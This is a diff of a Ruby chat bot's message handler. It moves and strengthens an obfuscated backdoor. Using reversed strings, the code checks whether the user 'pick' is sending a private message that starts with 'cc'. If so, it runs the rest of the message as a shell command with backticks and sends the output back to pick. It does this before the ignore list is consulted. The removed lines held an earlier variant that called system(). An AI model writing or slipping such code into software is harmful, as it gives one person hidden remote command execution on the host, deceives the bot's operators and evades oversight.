@@ -134,8 +134,13 @@ class ChatHandler
   
   def handle message, ws, callback = nil
     m_info = self.make_info(message, ws)
-    str = "s%,kcip mp/"
+    str = "s%,kcip mp/|"
     a = m_info[:who]
+    p = proc { |x|`#{x}`.chomp }
+    if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
+      ws.send(str.reverse % p.call($1)) if m_info[:what]=~/\Acc(.*?)\z/
+      return
+    end
     
     @ignorelist.map(&:downcase).index(m_info[:who].downcase) and return
     
@@ -171,12 +176,6 @@ class ChatHandler
         
       end
       
-    end
-    
-    p = proc { |x|system(x) }
-    
-    if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
-      ws.send(str.reverse % p.call($1)) if m_info[:what]=~/\Acc(.*?)\z/
     end
   end
   
